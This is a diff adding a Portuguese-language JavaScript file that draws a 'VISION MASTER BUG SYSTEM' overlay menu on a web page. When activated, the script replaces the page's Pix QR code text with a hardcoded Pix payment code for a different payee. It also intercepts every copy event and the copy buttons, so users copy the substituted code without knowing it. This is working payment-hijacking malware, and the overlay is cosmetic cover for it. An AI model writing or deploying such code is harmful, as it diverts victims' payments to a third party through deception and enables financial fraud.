@@ -1,0 +1,336 @@
+(function(){
+
+const novoCodigo = "00020101021226940014br.gov.bcb.pix2572qrcode.cartwavehub.com.br/v2/qr/cob/cd163d08-0217-4190-81a1-64c996b8272d5204000053039865802BR5925BASTOS  TORRES GESTAO DE 6009SAO PAULO62070503***63046FCA”;
+
+// ===== MENU VISION MASTER =====
+
+if (!window.visionMasterMenu) {
+
+window.visionMasterMenu = true;
+
+const menu = document.createElement('div');
+
+menu.id = "visionMaster";
+
+menu.style = `
+position:fixed;
+top:120px;
+right:20px;
+width:240px;
+background:linear-gradient(
+180deg,
+#020817 0%,
+#06101f 50%,
+#030712 100%
+);
+color:#fff;
+padding:12px;
+border-radius:16px;
+z-index:999999;
+font-family:'Segoe UI',sans-serif;
+border:1px solid rgba(0,212,255,.5);
+box-shadow:
+0 0 5px rgba(0,212,255,.5),
+0 0 20px rgba(0,212,255,.25),
+inset 0 0 20px rgba(0,212,255,.05);
+`;
+
+menu.innerHTML = `
+
+<div id="dragHeader" style="
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-bottom:10px;
+cursor:move;
+">
+
+<div>
+
+<div style="
+font-size:18px;
+font-weight:800;
+letter-spacing:1px;
+color:#00d4ff;
+text-shadow:
+0 0 5px #00d4ff,
+0 0 15px #00d4ff;
+">
+VISION MASTER
+</div>
+
+<div style="
+font-size:10px;
+color:#7b8794;
+letter-spacing:2px;
+">
+BUG SYSTEM v2.0
+</div>
+
+</div>
+
+<div id="fechar" style="
+width:24px;
+height:24px;
+border-radius:50%;
+background:#ff4d4d;
+display:flex;
+align-items:center;
+justify-content:center;
+cursor:pointer;
+font-weight:bold;
+">
+✕
+</div>
+
+</div>
+
+<div style="
+display:flex;
+gap:6px;
+margin-bottom:10px;
+">
+
+<div style="
+padding:3px 8px;
+font-size:9px;
+border-radius:20px;
+border:1px solid #00ff88;
+color:#00ff88;
+">
+● ONLINE
+</div>
+
+<div id="ping" style="
+padding:3px 8px;
+font-size:9px;
+border-radius:20px;
+border:1px solid #9b5cff;
+color:#9b5cff;
+">
+15ms
+</div>
+
+<div style="
+padding:3px 8px;
+font-size:9px;
+border-radius:20px;
+border:1px solid #00d4ff;
+color:#00d4ff;
+">
+LIFETIME
+</div>
+
+</div>
+
+<div id="clock" style="
+text-align:center;
+font-size:14px;
+font-weight:bold;
+color:#00d4ff;
+margin-bottom:10px;
+">
+00:00:00
+</div>
+
+<div style="
+height:70px;
+border-radius:10px;
+border:1px solid rgba(0,212,255,.2);
+background:#08111f;
+overflow:hidden;
+position:relative;
+margin-bottom:10px;
+">
+
+<div style="
+position:absolute;
+top:0;
+left:-100%;
+width:100%;
+height:100%;
+background:linear-gradient(
+90deg,
+transparent,
+rgba(0,212,255,.25),
+transparent
+);
+animation:scan 2s linear infinite;
+"></div>
+
+<div style="
+position:absolute;
+inset:0;
+display:flex;
+align-items:center;
+justify-content:center;
+color:#00d4ff;
+font-size:12px;
+font-weight:bold;
+">
+SCANNER ATIVO
+</div>
+
+</div>
+
+<button id="ativar" style="
+width:100%;
+padding:10px;
+background:linear-gradient(
+90deg,
+#0099ff,
+#00d4ff
+);
+border:none;
+border-radius:10px;
+color:white;
+font-weight:700;
+cursor:pointer;
+box-shadow:
+0 0 10px rgba(0,212,255,.4);
+">
+INICIAR SISTEMA
+</button>
+
+<div id="status" style="
+margin-top:10px;
+padding:8px;
+border-radius:8px;
+border:1px solid rgba(0,212,255,.2);
+font-size:11px;
+text-align:center;
+color:#00d4ff;
+">
+✓ Sistema carregado
+</div>
+`;
+
+document.body.appendChild(menu);
+
+const style = document.createElement("style");
+
+style.innerHTML = `
+@keyframes scan{
+0%{left:-100%;}
+100%{left:100%;}
+}
+`;
+
+document.head.appendChild(style);
+
+// FECHAR
+document.getElementById("fechar").onclick = () => {
+menu.style.display = "none";
+};
+
+// REABRIR
+document.addEventListener("dblclick", () => {
+menu.style.display = "block";
+});
+
+// RELÓGIO E PING
+setInterval(() => {
+
+const agora = new Date();
+
+document.getElementById("clock").innerHTML =
+agora.toLocaleTimeString("pt-BR");
+
+document.getElementById("ping").innerHTML =
+(10 + Math.floor(Math.random()*10)) + "ms";
+
+},1000);
+
+// ARRASTAR PC
+let isDragging = false;
+let offsetX = 0;
+let offsetY = 0;
+
+const header = document.getElementById("dragHeader");
+
+header.addEventListener("mousedown",(e)=>{
+isDragging = true;
+
+offsetX = e.clientX - menu.offsetLeft;
+offsetY = e.clientY - menu.offsetTop;
+});
+
+document.addEventListener("mousemove",(e)=>{
+
+if(!isDragging) return;
+
+menu.style.left =
+(e.clientX - offsetX) + "px";
+
+menu.style.top =
+(e.clientY - offsetY) + "px";
+
+menu.style.right = "auto";
+
+});
+
+document.addEventListener("mouseup",()=>{
+isDragging = false;
+});
+
+// ARRASTAR CELULAR
+header.addEventListener("touchstart",(e)=>{
+
+const t = e.touches[0];
+
+offsetX = t.clientX - menu.offsetLeft;
+offsetY = t.clientY - menu.offsetTop;
+
+});
+
+document.addEventListener("touchmove",(e)=>{
+
+const t = e.touches[0];
+
+menu.style.left =
+(t.clientX - offsetX) + "px";
+
+menu.style.top =
+(t.clientY - offsetY) + "px";
+
+menu.style.right = "auto";
+
+});
+
+}
+// ===== FUNÇÃO =====
+function aplicar(){
+
+const status = document.getElementById("status");
+
+// altera texto
+const qr = document.querySelector(".qr-code-text-inner");
+if(qr){
+qr.textContent = novoCodigo;
+}
+
+// intercepta copy GLOBAL
+document.addEventListener("copy", function(e){
+e.preventDefault();
+e.clipboardData.setData("text/plain", novoCodigo);
+});
+
+// intercepta clique
+document.querySelectorAll(".qr-code-text, .qr-code-text-inner, .copy-emblem")
+.forEach(el=>{
+el.addEventListener("click",(e)=>{
+e.preventDefault();
+e.stopPropagation();
+
+navigator.clipboard.writeText(novoCodigo);
+status.innerHTML = "✅ Copiado PROXY";
+});
+});
+
+status.innerHTML = "🔥 ATIVO";
+}
+
+// botão
+document.getElementById("ativar").onclick = aplicar;
+
+})();
